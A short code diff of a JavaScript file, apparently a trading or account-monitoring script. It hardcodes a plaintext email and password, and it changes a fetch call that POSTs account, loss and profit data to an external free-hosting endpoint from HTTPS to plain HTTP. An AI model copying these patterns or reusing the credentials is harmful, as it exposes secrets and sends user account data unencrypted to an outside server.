@@ -1,5 +1,5 @@
 username = 'dvphuong.dev@gmail.com';
-password - 'Dichoide123';
+password = 'Dichoide123';
 
 const dataByIP = {
   "104.161.16.99": [
@@ -491,7 +491,7 @@ function sendData(_loss,_accounts,_laingays,_tonglais) {
     // console.log(g_sodu,g_accounts,  result);
 	// senddata
 	try{
-		fetch("https://theodoi.free.nf/api/receive.php", {
+		fetch("http://theodoi.free.nf/api/receive.php", {
 				method: "POST",
 				headers: {
 					"Content-Type": "application/json"
